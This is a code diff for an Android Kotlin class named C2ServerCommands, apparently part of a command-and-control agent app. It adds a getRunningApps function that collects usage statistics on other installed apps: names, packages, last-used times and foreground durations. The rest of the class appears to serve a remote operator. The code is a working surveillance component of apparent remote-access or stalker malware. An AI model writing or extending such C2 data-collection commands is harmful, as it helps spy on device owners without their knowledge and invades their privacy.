@@ -349,6 +349,69 @@ class C2ServerCommands(private val context: Context) {
         }.sorted().joinToString(separator = "\n").ifEmpty { "No user apps found" }
     }
 
+    fun getRunningApps(): String {
+        return try {
+            val pm = context.packageManager
+            var result = ""
+
+            // Try UsageStatsManager first (requires PACKAGE_USAGE_STATS permission)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
+                val time = System.currentTimeMillis()
+                // Look at the last hour
+                val usageStats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, time - 1000 * 60 * 60, time)
+
+                if (!usageStats.isNullOrEmpty()) {
+                    val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
+                    result = usageStats.filter { it.lastTimeUsed > 0 && it.packageName != context.packageName }
+                        .sortedByDescending { it.lastTimeUsed }
+                        .distinctBy { it.packageName } // Keep only the most recent entry per package
+                        .map { stats ->
+                            val packageName = stats.packageName
+                            val appName = try {
+                                val appInfo = pm.getApplicationInfo(packageName, 0)
+                                pm.getApplicationLabel(appInfo).toString()
+                            } catch (e: Exception) {
+                                "Unknown"
+                            }
+
+                            val lastUsed = dateFormat.format(java.util.Date(stats.lastTimeUsed))
+                            val mins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(stats.totalTimeInForeground)
+                            val secs = java.util.concurrent.TimeUnit.MILLISECONDS.toSeconds(stats.totalTimeInForeground) % 60
+
+                            "$appName ($packageName)\n    └ Last used: $lastUsed | Foreground time: ${mins}m ${secs}s"
+                        }.joinToString(separator = "\n")
+                }
+            }
+
+            // Fallback to ActivityManager (will likely only show this app on modern Android without permissions)
+            if (result.isEmpty()) {
+                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+                val runningApps = am.runningAppProcesses
+
+                if (runningApps.isNullOrEmpty()) {
+                    result = "No running apps found (May need PACKAGE_USAGE_STATS permission)"
+                } else {
+                    result = runningApps.map { processInfo ->
+                        val packageName = processInfo.processName
+                        val appName = try {
+                            val appInfo = pm.getApplicationInfo(packageName, 0)
+                            pm.getApplicationLabel(appInfo).toString()
+                        } catch (e: Exception) {
+                            "Unknown"
+                        }
+                        val importance = processInfo.importance
+                        "$appName ($packageName) [imp:$importance]"
+                    }.sorted().joinToString(separator = "\n")
+                }
+            }
+
+            result
+        } catch (e: Exception) {
+            "Error getting running apps: ${e.message}"
+        }
+    }
+
     fun sendNotification(title: String, message: String) {
         val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         val notification = NotificationCompat.Builder(context, AgentService.CHANNEL_ID)
